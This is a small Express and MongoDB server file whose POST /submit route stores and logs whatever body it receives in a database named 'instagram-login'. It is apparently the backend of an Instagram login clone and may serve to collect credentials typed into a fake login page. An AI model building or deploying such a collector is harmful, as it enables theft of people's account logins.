const express = require("express");
const { MongoClient } = require("mongodb");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 10000;
const mongoUri = process.env.MONGODB_URI;

app.use(express.json());

let dbClient;

// MongoDB Connection Setup
async function connectToDatabase() {
  try {
    dbClient = new MongoClient(mongoUri);
    await dbClient.connect();
    console.log("Connected to MongoDB successfully.");
  } catch (error) {
    console.error("Failed to connect to MongoDB:", error);
    process.exit(1);
  }
}

connectToDatabase();

// Route to insert data into MongoDB
app.post("/submit", async (req, res) => {
  try {
    const data = req.body;
    console.log("Received data:", data);

    const database = dbClient.db("instagram-login"); // Define your DB name
    const collection = database.collection("users"); // Define your collection name

    const result = await collection.insertOne(data);
    res.status(201).json({ message: "Data inserted successfully", result });
    console.log("Data inserted:", result);
  } catch (error) {
    console.error("Error inserting data:", error);
    res.status(500).json({ message: "Failed to insert data", error });
  }
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
